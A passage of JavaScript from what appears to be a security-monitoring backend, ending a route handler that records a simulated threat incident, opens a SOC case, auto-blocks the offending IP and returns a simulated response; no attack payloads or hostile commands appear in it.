    created_at_wat: getWATFormattedDate(),
  };

  await db.saveIncident(incident);
  realtimeAlertHub.broadcastThreat(incident);
  socEngine.createCaseFromIncident({
    id: incident.id,
    systemId,
    threatClassification: incident.threat_classification,
    severity: 'CRITICAL',
    offendingIp: chosen.ip,
    targetEndpoint: chosen.path,
    capturedPayload: chosen.payload,
  });
  socEngine.blockIp({
    ip: chosen.ip,
    reason: `Zero-Trust / Deception Auto-Quarantine: ${incident.threat_classification}`,
    threatClassification: incident.threat_classification,
    systemId: `${systemId} & THE-WATCH-SOC`,
    blockedBy: 'Zero-Trust, Honeypot & DLP SOAR Engine',
  });

  ingestQueue.enqueue({
    systemId,
    method: chosen.method,
    path: chosen.path,
    statusCode: 403,
    latencyMs: 2,
    clientIp: chosen.ip,
    payloadSnippet: `[BLOCKED_BY_ZERO_TRUST_DECEPTION_DLP] ${chosen.payload}`,
    userAgent: chosen.userAgent,
  });

  res.status(201).json({
    simulated: true,
    scenario: chosenKey,
    incident,
    defenseAction: chosen.defenseAction,
    timestampWat: getWATFormattedDate(),
  });
});
